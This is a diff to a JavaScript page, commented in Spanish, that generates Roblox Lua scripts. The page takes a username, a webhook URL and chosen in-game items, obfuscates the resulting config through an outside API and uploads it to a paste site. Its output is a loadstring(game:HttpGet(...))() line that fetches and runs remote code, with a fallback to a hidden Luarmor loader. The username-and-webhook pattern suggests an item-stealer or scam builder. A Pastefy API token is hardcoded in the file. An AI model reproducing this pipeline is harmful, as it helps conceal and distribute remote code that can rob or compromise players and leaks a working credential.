@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
 
     // ============================================================
-    //  CONFIGURACIÓN (SOLO PASTEFY)
+    //  CONFIGURACIÓN
     // ============================================================
     const PASTEFY_API_TOKEN = '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
 
@@ -56,7 +56,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // ============================================================
-    //  TODOS LOS BRAINROTS
+    //  TODOS LOS BRAINROTS (COMPLETOS)
     // ============================================================
     const brainrotLists = {
         Common: [
@@ -435,8 +435,38 @@ document.addEventListener('DOMContentLoaded', () => {
     const gearsSelected = renderPills('gearsContainer', gearItems, 'gearsSearch', 'gearsCounter', 'gearsAll', 'gearsNone');
 
     // ============================================================
-    //  FUNCIÓN PASTEFY (CORREGIDA)
+    //  FUNCIONES DE API (WeAreDevs + Pastefy)
     // ============================================================
+
+    // --- OFUSCAR CON WeAreDevs (URL CORREGIDA) ---
+    async function obfuscateWithWeAreDevs(script) {
+        const response = await fetch('https://wearedevs.net/api/obfuscate', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ script: script })
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
+        }
+
+        const data = await response.json();
+
+        if (!data.success) {
+            throw new Error(data.error || 'WeAreDevs devolvió success: false');
+        }
+
+        const obfuscated = data.obfuscated;
+        if (!obfuscated) {
+            throw new Error(`No se pudo obtener el script ofuscado. Respuesta: ${JSON.stringify(data)}`);
+        }
+        return obfuscated;
+    }
+
+    // --- PASTEFY ---
     async function createPastefyPaste(content) {
         const url = 'https://pastefy.app/api/v2/paste';
         const payload = {
@@ -464,9 +494,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         const result = await response.json();
-        console.log('Respuesta Pastefy completa:', result);
+        console.log('Respuesta Pastefy:', result);
 
-        // Extraer el ID del paste
         let pasteId = null;
         if (result.paste && result.paste.id) {
             pasteId = result.paste.id;
@@ -482,30 +511,11 @@ document.addEventListener('DOMContentLoaded', () => {
             throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
         }
 
-        // --- CORRECCIÓN: URL en el formato correcto ---
         return `https://pastefy.app/${pasteId}/raw`;
     }
-        async function obfuscateWithWeAreDevs(script) {
-            const response = await fetch('/api/obfuscate', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    script: script
-                })
-            });
-        
-            const data = await response.json();
-        
-            if (!data.success) {
-                throw new Error(data.error || 'Obfuscation failed');
-            }
-        
-            return data.obfuscated;
-        }
+
     // ============================================================
-    //  GENERAR SCRIPT (SOLO PASTEFY, SIN OFUSCAR)
+    //  GENERAR SCRIPT (FLUJO CORREGIDO)
     // ============================================================
     const generateBtn = document.getElementById('generateBtn');
     const outputSection = document.getElementById('outputSection');
@@ -516,7 +526,8 @@ document.addEventListener('DOMContentLoaded', () => {
         return Array.from(set);
     }
 
-    function buildBaseScript() {
+    // --- NUEVA FUNCIÓN: SOLO CONFIGURACIÓN (SIN task.spawn) ---
+    function buildConfigScript() {
         const username = document.getElementById('username').value.trim() || 'USERNAME';
         const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';
         const mode = document.querySelector('.mode-btn.active')?.id === 'modeNormal' ? 'NORMAL' : 'CUSTOM';
@@ -548,11 +559,6 @@ document.addEventListener('DOMContentLoaded', () => {
             script += `getgenv().${modePrefix}_GEARS = ${luaTable(gears)}\n`;
         }
 
-        // Añadir el task.spawn con un placeholder
-        script += `task.spawn(function()\n`;
-        script += `    loadstring(game:HttpGet("__PASTEFY_URL__"))()\n`;
-        script += `end)`;
-
         return script;
     }
 
@@ -561,49 +567,55 @@ document.addEventListener('DOMContentLoaded', () => {
         generateBtn.disabled = true;
 
         try {
-            const baseScript = buildBaseScript();
-            console.log("SCRIPT BASE:");
-            console.log(baseScript);
-            console.log('Ofuscando...');
-            console.log("=== SCRIPT ENVIADO A WEAREDEVS ===");
-            console.log(baseScript);
-            console.log("=== FIN SCRIPT ===");
-            const obfuscatedScript = await obfuscateWithWeAreDevs(baseScript);
-
-            // Si el usuario ha activado "Short Loadstring" y seleccionado "PASTEFY"
             if (shortEnabled && selectedProvider === 'pastefy') {
                 try {
-                    // 1. Subir el script completo a Pastefy (sin ofuscar)
-                    console.log(obfuscatedScript);
-                    const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-                    console.log('Script subido a Pastefy:', pastefyUrl);
+                    // 1. Construir script de configuración (sin task.spawn)
+                    const configScript = buildConfigScript();
+                    console.log('Configuración a ofuscar:');
+                    console.log(configScript);
 
-                    // 2. El script final será SOLO la línea loadstring
+                    // 2. Ofuscar con WeAreDevs
+                    console.log('Ofuscando con WeAreDevs...');
+                    const obfuscatedScript = await obfuscateWithWeAreDevs(configScript);
+                    console.log('Ofuscación completada.');
+
+                    // 3. Subir el script ofuscado a Pastefy
+                    console.log('Subiendo a Pastefy...');
+                    const pastefyUrl = await createPastefyPaste(obfuscatedScript);
+                    console.log('Paste creado:', pastefyUrl);
+
+                    // 4. El script final será SOLO la línea loadstring
                     const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
                     outputCode.textContent = finalScript;
 
                 } catch (apiError) {
-                    console.error('Error en Pastefy:', apiError);
-                    alert(`Error al subir a Pastefy: ${apiError.message}\n\nSe usará la URL por defecto.`);
-                    // Fallback: mostrar el script completo con URL por defecto
-                    const fallbackScript = baseScript.replace('"__PASTEFY_URL__"', '"https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"');
+                    console.error('Error en el flujo automático:', apiError);
+                    alert(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`);
+                    // Fallback: mostrar el script de configuración (sin ofuscar) con URL por defecto
+                    const configScript = buildConfigScript();
+                    const fallbackScript = configScript + 
+                        `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"))()\nend)`;
                     outputCode.textContent = fallbackScript;
                 }
 
             } else if (shortEnabled) {
                 // Otros proveedores (no implementados)
+                const configScript = buildConfigScript();
                 const providerUrls = {
                     pastefy: '',
                     voidexternal: 'https://void.external/raw/...',
                     rubis: 'https://rubis.xyz/raw/...'
                 };
                 const url = providerUrls[selectedProvider] || 'https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua';
-                const fallbackScript = baseScript.replace('"__PASTEFY_URL__"', `"${url}"`);
+                const fallbackScript = configScript + 
+                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("${url}"))()\nend)`;
                 outputCode.textContent = fallbackScript;
 
             } else {
                 // Modo normal (sin short loadstring)
-                const normalScript = baseScript.replace('"__PASTEFY_URL__"', '"https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"');
+                const configScript = buildConfigScript();
+                const normalScript = configScript + 
+                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/6625e9364304e396fc39d367e39e9b24.lua"))()\nend)`;
                 outputCode.textContent = normalScript;
             }
 
